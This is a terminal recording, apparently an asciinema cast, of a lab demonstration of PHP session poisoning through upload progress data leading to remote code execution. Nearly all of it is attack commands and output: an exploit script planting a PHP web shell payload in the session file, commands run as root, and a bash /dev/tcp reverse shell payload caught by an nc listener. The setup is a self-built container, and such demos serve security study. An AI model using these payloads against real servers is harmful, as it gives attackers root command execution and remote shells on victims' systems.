[0.003693, "o", "\u001b[H\u001b[2J\u001b[3J"]
[0.004127, "o", "\u001b[1;37mPHP session poisoning -> RCE\u001b[0m\r\n\u001b[0;90mPHP 8.5.11 · lab container · no CVE (application flaw)\u001b[0m\r\n"]
[1.504785, "o", "\r\n\u001b[1;36m1. Build and start the vulnerable lab\u001b[0m\r\n"]
[2.10607, "o", "\u001b[1;32m$ \u001b[0mdocker build -q -t p2s-lab lab/\r\n"]
[2.625919, "o", "sha256:e8001a996bab23d670f7e33f821ffd5f4043599fccf017cdd1e26d35f5742f22\r\n"]
[2.626107, "o", "\u001b[1;32m$ \u001b[0mdocker run -d --name p2s p2s-lab\r\n"]
[7.306931, "o", "\u001b[1;32m$ \u001b[0mcurl -s http://p2s:8088/ | head -1\r\n"]
[7.976224, "o", "<h1>PixelVault</h1><p>upload ok</p>\r\n"]
[9.630748, "o", "\r\n\u001b[1;36m2. Send the multipart request (payload in the field NAME)\u001b[0m\r\n"]
[10.231673, "o", "\u001b[1;32m$ \u001b[0mpython3 scripts/exploit_generic.py p2s 8088 /view.php tpl\r\n"]
[10.938881, "o", "[*] target   : http://p2s:8088/view.php?tpl=\r\n[*] sid      : fb5b4a490afeff75aeceb7ecb9578e7c\r\n[*] payload  : <?php system($_GET['c']);?>\r\n[1] poison   -> HTTP 200\r\n[2] include  -> HTTP 200\r\n[+] RCE      : TAK\r\n    upload_progress_uid=0(root) gid=0(root) groups=0(root)\r\n    PWNED\r\n"]
[13.12726, "o", "\r\n\u001b[1;36m3. What landed in the session file\u001b[0m\r\n"]
[13.729961, "o", "\u001b[1;32m$ \u001b[0mdocker exec p2s head -c 120 /tmp/sess/* \r\n"]
[14.287224, "o", "upload_progress_<?php system($_GET['c']);?>|a:5:{s:10:\"start_time\";i:1792589551;s:14:\"content_length\";i:2293;s:15:\"bytes"]
[14.288429, "o", "\r\n"]
[16.789689, "o", "\r\n\u001b[1;36m4. Reverse shell\u001b[0m\r\n"]
[17.391462, "o", "\u001b[1;32m$ \u001b[0mnc -lvp 4444   (listener)\r\n"]
[17.89302, "o", "\u001b[1;32m$ \u001b[0mpython3 shell/reverse_shell.py p2s <our-ip> 4444 /view.php tpl 8088\r\n"]
[20.780349, "o", "[*] target  : http://p2s:8088/view.php?tpl=\r\n[*] callback: 192.168.240.4:4444\r\n[*] payload : <?php system(\"bash -c 'bash -i >& /dev/tcp/192.168.240.4/4444 0>&1' &\");?>\r\n[1] poison   -> HTTP 200\r\n"]
[26.082414, "o", "\r\n\u001b[1;33m--- listener output ---\u001b[0m\r\n"]
[26.097164, "o", "connect to [::ffff:192.168.240.4]:4444 from p2s.uaflab:35764 ([::ffff:192.168.240.2]:35764)\r\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nroot@90c8b4939554:/app# exit\r\n"]
[28.098382, "o", "\r\n\u001b[1;36m5. Cleanup\u001b[0m\r\n"]
[28.70027, "o", "\u001b[1;32m$ \u001b[0mdocker rm -f p2s dlsn\r\n"]
[29.422566, "o", "done\r\n"]
